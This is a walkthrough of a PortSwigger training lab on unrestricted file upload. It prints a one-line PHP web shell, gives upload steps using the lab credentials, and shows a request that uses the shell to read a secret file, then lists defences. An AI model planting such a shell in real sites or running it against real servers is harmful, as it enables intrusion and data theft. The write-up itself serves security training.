# Remote Code Execution via Web Shell Upload

[Remote Code Execution via Web Shell Upload](https://portswigger.net/web-security/learning-paths/file-upload-vulnerabilities/exploiting-unrestricted-file-uploads-to-deploy-a-web-shell/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload)

[YouTube Video](https://youtu.be/AIUyFH5jeVA)

**Difficulty:** Apprentice

**Objective:** Upload a basic PHP web shell via the avatar upload function and use it to exfiltrate the contents of `/home/carlos/secret`.

This lab is best watched on the YouTube video where we go through the full thought process in real time.

## Lab Overview

This lab contains a vulnerable image upload function. It performs no validation whatsoever on the files users upload before storing them on the server's filesystem. This means we can upload a PHP file that the server will execute when accessed directly.

**Login credentials provided:** `wiener:peter`

## The Vulnerability

The avatar upload function accepts any file type. There are no checks on:
- File extension
- Content-Type header
- File contents
- Magic bytes

This means we can upload a `.php` file and the server will store it alongside legitimate images. Since the server runs PHP, accessing the uploaded file directly will execute it as code.

## The Exploit

### Step 1: Create a PHP Web Shell

The simplest possible PHP webshell:

    <?php echo system($_GET['cmd']); ?>

This takes a command from the `cmd` URL parameter and executes it on the server, returning the output.

### Step 2: Upload the Web Shell

1. Log in with `wiener:peter`
2. Go to "My Account"
3. Upload the PHP file as your avatar
4. The application accepts it without any complaint

### Step 3: Execute Commands

The uploaded files are stored at `/files/avatars/`. Access the web shell directly:

    /files/avatars/phpshell.php?cmd=cat+/home/carlos/secret

The server executes the PHP file, runs the `cat` command, and returns the contents of Carlos's secret file.

### Step 4: Submit the Secret

Copy the secret value from the response and submit it in the lab banner.

## Key Takeaways

- **Never trust file uploads.** If your application accepts file uploads, you must validate the file extension, content type, and ideally the file contents.

- **Store uploads outside the web root.** Even if a malicious file gets uploaded, it can't be executed if it's not in a location the web server will process.

- **Don't rely on client-side validation.** Any client-side checks can be bypassed with Burp Suite or by crafting requests manually.

- **Use allowlists, not blocklists.** Only permit specific known-safe file extensions like `.jpg`, `.png`, `.gif` rather than trying to block dangerous ones.

- **Consider renaming uploaded files.** Stripping the original filename and extension prevents attackers from controlling how the server interprets the file.

## Tools Used

- Burp Suite Community Edition